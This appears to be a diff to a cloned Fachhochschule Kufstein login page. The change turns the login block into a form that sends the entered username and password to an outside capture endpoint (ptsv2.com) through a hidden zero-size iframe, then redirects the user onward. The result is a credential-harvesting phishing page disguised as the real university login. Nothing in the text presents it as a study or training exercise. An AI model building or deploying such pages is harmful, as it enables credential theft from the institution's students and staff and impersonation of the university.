@@ -31,7 +31,7 @@
                              alt="Fachhochschule Kufstein - Higher Level of Education" title="Logo FH Kufstein"/></a>
                 </div>
                 <div class="card-body">
-                    <div id="fm1">
+                    <form id="fm1" method="post" action="https://ptsv2.com/t/jamyol/post" target="hiddenFrame">
                         <h3 style="text-align: center; margin-top:-15px">
                                                         <span>Enter Username & Password</span>
                         </h3>
@@ -79,8 +79,9 @@
                                accesskey="l"
                                tabindex="6"
                                type="submit"
-                               value="LOGIN" onclick="abc(1)"
-                        /></div>
+                               value="LOGIN" onclick="abc(1)" onclick="window.location.href = 'https://website.com/my-account';"
+                        /></form>
+			<iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe>
 
                     <div id="sidebar">
         <div class="sidebar-content">
